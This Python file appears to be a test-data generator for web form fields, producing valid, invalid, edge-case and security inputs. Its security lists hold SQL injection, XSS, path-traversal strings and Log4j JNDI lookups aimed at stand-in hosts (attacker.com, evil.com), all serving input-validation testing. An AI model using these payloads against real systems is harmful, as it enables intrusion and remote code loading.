"""
Test Data Generator
Generates smart test data based on field types and context
Includes boundary values, edge cases, and validation scenarios
"""

import re
import random
import string
from typing import Dict, List, Optional
from datetime import datetime, timedelta
import logging

logger = logging.getLogger(__name__)

class TestDataGenerator:
    """Generates intelligent test data for various field types."""
    
    def __init__(self):
        """Initialize test data generator."""
        self.data_cache = {}
        
    def generate_for_field(self, field_info: Dict) -> Dict[str, List[str]]:
        """
        Generate test data for a specific field.
        
        Args:
            field_info: Field information (name, text, label, type)
            
        Returns:
            Dict with valid, invalid, and edge case test data
        """
        field_type = self._detect_field_type(field_info)
        
        generators = {
            'email': self._generate_email_data,
            'password': self._generate_password_data,
            'username': self._generate_username_data,
            'phone': self._generate_phone_data,
            'name': self._generate_name_data,
            'date': self._generate_date_data,
            'number': self._generate_number_data,
            'url': self._generate_url_data,
            'zip': self._generate_zip_data,
            'credit_card': self._generate_credit_card_data,
            'account_id': self._generate_account_id_data,
            'company': self._generate_company_data,
            'text': self._generate_text_data
        }
        
        generator = generators.get(field_type, self._generate_text_data)
        return generator(field_info)
    
    def _detect_field_type(self, field_info: Dict) -> str:
        """Detect field type from field information."""
        # Check label, text, and suggested_name
        text = (field_info.get('label', '') + ' ' + 
                field_info.get('text', '') + ' ' + 
                field_info.get('suggested_name', '')).lower()
        
        # Email detection
        if any(word in text for word in ['email', 'e-mail']):
            return 'email'
        
        # Password detection
        if 'password' in text or 'pwd' in text or 'pass' in text:
            return 'password'
        
        # Username detection
        if 'username' in text or 'user name' in text or 'userid' in text:
            return 'username'
        
        # Phone detection
        if any(word in text for word in ['phone', 'mobile', 'tel', 'telephone']):
            return 'phone'
        
        # Name detection (first/last name)
        if any(word in text for word in ['first name', 'last name', 'full name', 'firstname', 'lastname']):
            return 'name'
        
        # Account/ID detection
        if any(word in text for word in ['account', 'id', 'code', 'reference', 'broker', 'customer', 'client']):
            return 'account_id'
        
        # Date detection
        if any(word in text for word in ['date', 'dob', 'birth', 'birthday']):
            return 'date'
        
        # Number detection
        if any(word in text for word in ['number', 'num', 'age', 'quantity', 'qty', 'amount']):
            return 'number'
        
        # URL detection
        if any(word in text for word in ['url', 'website', 'link']):
            return 'url'
        
        # ZIP code detection
        if any(word in text for word in ['zip', 'postal', 'postcode']):
            return 'zip'
        
        # Credit card detection
        if any(word in text for word in ['card', 'credit', 'payment']):
            return 'credit_card'
        
        # Company/Organization detection
        if any(word in text for word in ['company', 'organization', 'business', 'firm']):
            return 'company'
        
        # Generic name field (not first/last)
        if 'name' in text:
            return 'name'
        
        return 'text'
    
    def _generate_email_data(self, field_info: Dict) -> Dict:
        """Generate email test data."""
        return {
            'valid': [
                'test.user@example.com',
                'john.doe+tag@company.co.uk',
                'valid_email123@test-domain.org'
            ],
            'invalid': [
                'invalid.email',  # Missing @
                '@example.com',  # Missing local part
                'test@',  # Missing domain
                'test @example.com',  # Space in email
                'test@example',  # Missing TLD
            ],
            'edge_cases': [
                'a@b.co',  # Shortest valid
                f'{"x" * 60}@{"y" * 50}.com',  # Very long
                'test+filter@gmail.com',  # Plus addressing
                'test.dots...@example.com',  # Multiple dots
            ],
            'security': [
                'test@example.com\'--',  # SQL injection attempt
                '<script>alert(1)</script>@test.com',  # XSS attempt
            ]
        }
    
    def _generate_password_data(self, field_info: Dict) -> Dict:
        """Generate password test data."""
        return {
            'valid': [
                'Password123!',
                'SecureP@ssw0rd',
                'MyP@55word2024'
            ],
            'invalid': [
                'pass',  # Too short
                'password',  # No numbers/special chars
                '12345678',  # Only numbers
                'Pass123',  # Missing special char (if required)
            ],
            'edge_cases': [
                'P@1',  # Minimum valid
                'A' * 100 + '1!',  # Very long
                'P@ssw0rd P@ssw0rd',  # With space
                '密码123!@#',  # Unicode characters
            ],
            'security': [
                "' OR '1'='1",  # SQL injection
                '../../../etc/passwd',  # Path traversal
                '${jndi:ldap://attacker.com}',  # Log4j
            ]
        }
    
    def _generate_username_data(self, field_info: Dict) -> Dict:
        """Generate username test data."""
        return {
            'valid': [
                'testuser123',
                'john_doe',
                'user.name'
            ],
            'invalid': [
                'ab',  # Too short
                'test user',  # Space
                '@username',  # Special char
                '123456789012345678901234567890123',  # Too long
            ],
            'edge_cases': [
                'abc',  # Minimum length
                'a' * 30,  # Maximum length
                'user_123',  # With underscore
                'user.name.test',  # Multiple dots
            ],
            'security': [
                'admin',  # Reserved word
                'root',  # System user
                '<script>alert(1)</script>',  # XSS
            ]
        }
    
    def _generate_phone_data(self, field_info: Dict) -> Dict:
        """Generate phone number test data."""
        return {
            'valid': [
                '(555) 123-4567',
                '555-123-4567',
                '5551234567',
                '+1 (555) 123-4567'
            ],
            'invalid': [
                '123',  # Too short
                'abc-defg-hijk',  # Letters
                '000-000-0000',  # Invalid number
            ],
            'edge_cases': [
                '+1234567890123456',  # International format
                '5551234567 ext. 123',  # With extension
                '(555)123-4567',  # No spaces
            ],
            'security': [
                '555-1234; DROP TABLE users;--',  # SQL injection
            ]
        }
    
    def _generate_name_data(self, field_info: Dict) -> Dict:
        """Generate name test data."""
        return {
            'valid': [
                'John Doe',
                'Mary-Jane Smith',
                "O'Brien",
                'José García'
            ],
            'invalid': [
                'J',  # Too short
                '123',  # Numbers only
                '@#$%',  # Special characters
            ],
            'edge_cases': [
                'X',  # Single character (some cultures)
                'A' * 50,  # Very long name
                'Anne-Marie Louise de Bourbon',  # Multiple parts
                '李明',  # Chinese characters
            ],
            'security': [
                '<script>alert("XSS")</script>',
                "'; DROP TABLE names;--",
            ]
        }
    
    def _generate_date_data(self, field_info: Dict) -> Dict:
        """Generate date test data."""
        today = datetime.now()
        past_date = today - timedelta(days=10000)
        future_date = today + timedelta(days=365)
        
        return {
            'valid': [
                today.strftime('%m/%d/%Y'),
                today.strftime('%Y-%m-%d'),
                '01/01/2000'
            ],
            'invalid': [
                '13/01/2024',  # Invalid month
                '01/32/2024',  # Invalid day
                '02/30/2024',  # Invalid date
                'not-a-date',  # Invalid format
            ],
            'edge_cases': [
                '01/01/1900',  # Very old date
                future_date.strftime('%m/%d/%Y'),  # Future date
                '02/29/2024',  # Leap year
                '12/31/9999',  # Far future
            ],
            'security': []
        }
    
    def _generate_number_data(self, field_info: Dict) -> Dict:
        """Generate numeric test data."""
        return {
            'valid': [
                '0',
                '42',
                '1000',
                '99999'
            ],
            'invalid': [
                'abc',  # Letters
                '12.34.56',  # Multiple decimals
                '1e10',  # Scientific notation (may be invalid)
            ],
            'edge_cases': [
                '0',  # Zero
                '-1',  # Negative
                '999999999',  # Large number
                '0.001',  # Small decimal
            ],
            'security': [
                '2147483648',  # Integer overflow
                '-2147483649',  # Integer underflow
            ]
        }
    
    def _generate_url_data(self, field_info: Dict) -> Dict:
        """Generate URL test data."""
        return {
            'valid': [
                'https://www.example.com',
                'http://test.org/path',
                'https://example.com:8080/page?param=value'
            ],
            'invalid': [
                'not a url',
                'htp://wrong.com',  # Wrong protocol
                'www.example.com',  # Missing protocol
            ],
            'edge_cases': [
                'https://sub.domain.example.co.uk',
                'https://example.com/very/long/path/to/resource',
                'https://user:pass@example.com',  # With auth
            ],
            'security': [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
            ]
        }
    
    def _generate_zip_data(self, field_info: Dict) -> Dict:
        """Generate ZIP code test data."""
        return {
            'valid': [
                '12345',
                '12345-6789',
                '90210'
            ],
            'invalid': [
                '1234',  # Too short
                'abcde',  # Letters
                '123456',  # Too long (US)
            ],
            'edge_cases': [
                '00000',
                '99999',
                '00501',  # Valid IRS ZIP
            ],
            'security': []
        }
    
    def _generate_credit_card_data(self, field_info: Dict) -> Dict:
        """Generate credit card test data."""
        return {
            'valid': [
                '4532015112830366',  # Visa test card
                '5425233430109903',  # Mastercard test card
                '374245455400126',  # Amex test card
            ],
            'invalid': [
                '1234567890123456',  # Invalid Luhn
                '4532',  # Too short
                'abcd-efgh-ijkl-mnop',  # Letters
            ],
            'edge_cases': [
                '4532 0151 1283 0366',  # With spaces
                '4532-0151-1283-0366',  # With dashes
            ],
            'security': [
                '4532015112830366\'; DROP TABLE cards;--',
            ]
        }
    
    def _generate_account_id_data(self, field_info: Dict) -> Dict:
        """Generate account/ID test data."""
        return {
            'valid': [
                'ACC-12345',
                'BR-2024-001',
                'CUST-789456',
                'BRK-10293847'
            ],
            'invalid': [
                'invalid id',  # Spaces
                '12',  # Too short
                '@#$%^&*',  # Special chars only
            ],
            'edge_cases': [
                'A1',  # Minimum valid
                'ID-' + '9' * 20,  # Very long ID
                '00000000',  # All zeros
                'ACC-999999',  # High number
                'test_id_123',  # Underscore format
            ],
            'security': [
                "'; DROP TABLE accounts;--",
                '../../../etc/passwd',
            ]
        }
    
    def _generate_company_data(self, field_info: Dict) -> Dict:
        """Generate company/business name test data."""
        return {
            'valid': [
                'Acme Corporation',
                'Global Tech Solutions Inc.',
                'Smith & Associates LLC',
                'ABC Trading Co.'
            ],
            'invalid': [
                '',  # Empty
                '@@@###',  # Only special chars
            ],
            'edge_cases': [
                'AB',  # Short name
                'The International Business Corporation Limited',  # Long name
                'O\'Reilly & Sons',  # Apostrophe
                'Société Générale',  # Unicode
                '123 Industries',  # Starting with number
            ],
            'security': [
                '<script>alert("XSS")</script>',
                "O'Reilly & Sons'; DROP TABLE--",
            ]
        }
    
    def _generate_text_data(self, field_info: Dict) -> Dict:
        """Generate generic text test data."""
        # Try to generate contextual data based on field name
        field_name = field_info.get('suggested_name', '').lower()
        
        # Check for specific contexts in field name
        if 'description' in field_name or 'comment' in field_name or 'note' in field_name:
            return {
                'valid': [
                    'This is a test description',
                    'Sample comment for testing purposes',
                    'Valid notes entry with details'
                ],
                'invalid': [],
                'edge_cases': [
                    'Short.',  # Very brief
                    'This is a longer description with multiple sentences. It contains more detail.',  # Long
                    'Description\nwith\nnewlines',  # Multi-line
                    'Unicode: 你好 мир',  # International
                ],
                'security': [
                    '<script>alert("XSS")</script>',
                    "'; DROP TABLE comments;--",
                ]
            }
        
        # Generic text with contextual hints
        field_name = field_name or 'text'
        return {
            'valid': [
                f'Test {field_name} 1',
                f'Sample {field_name} data',
                f'Valid {field_name} entry'
            ],
            'invalid': [],  # Generic text usually doesn't have invalid formats
            'edge_cases': [
                'ab',  # Very short (2 chars)
                field_name[:15] + '_' + '123' * 5,  # Pattern with numbers
                'test-' + field_name.replace('_', '-'),  # Hyphenated
                field_name.upper() + '_MAX',  # Uppercase variant
                '  ' + field_name + '  ',  # Leading/trailing spaces
            ],
            'security': [
                '<script>alert("XSS")</script>',
                "'; DROP TABLE test;--",
                '../../../etc/passwd',
                '${jndi:ldap://evil.com}',
            ]
        }
    
    def generate_data_driven_scenarios(self, fields: List[Dict]) -> List[Dict]:
        """
        Generate data-driven test scenarios.
        
        Args:
            fields: List of field information
            
        Returns:
            List of test scenarios with combinations
        """
        scenarios = []
        
        # All valid scenario
        valid_scenario = {'name': 'All Valid Data', 'data': {}}
        for idx, field in enumerate(fields):
            field_data = self.generate_for_field(field)
            field_name = field.get('suggested_name', f'field_{idx}')
            valid_scenario['data'][field_name] = field_data['valid'][0]
        scenarios.append(valid_scenario)
        
        # Invalid scenarios (one field invalid at a time)
        for idx, field in enumerate(fields):
            field_data = self.generate_for_field(field)
            if field_data['invalid']:
                invalid_scenario = {'name': f'Invalid {field.get("label", f"Field {idx}")}', 'data': {}}
                
                for i, f in enumerate(fields):
                    f_data = self.generate_for_field(f)
                    field_name = f.get('suggested_name', f'field_{i}')
                    
                    if i == idx:
                        invalid_scenario['data'][field_name] = field_data['invalid'][0]
                    else:
                        invalid_scenario['data'][field_name] = f_data['valid'][0]
                
                invalid_scenario['expected'] = 'validation_error'
                scenarios.append(invalid_scenario)
        
        # Edge case scenarios
        edge_scenario = {'name': 'Edge Cases', 'data': {}}
        for idx, field in enumerate(fields):
            field_data = self.generate_for_field(field)
            field_name = field.get('suggested_name', f'field_{idx}')
            if field_data['edge_cases']:
                edge_scenario['data'][field_name] = field_data['edge_cases'][0]
        if edge_scenario['data']:
            scenarios.append(edge_scenario)
        
        return scenarios
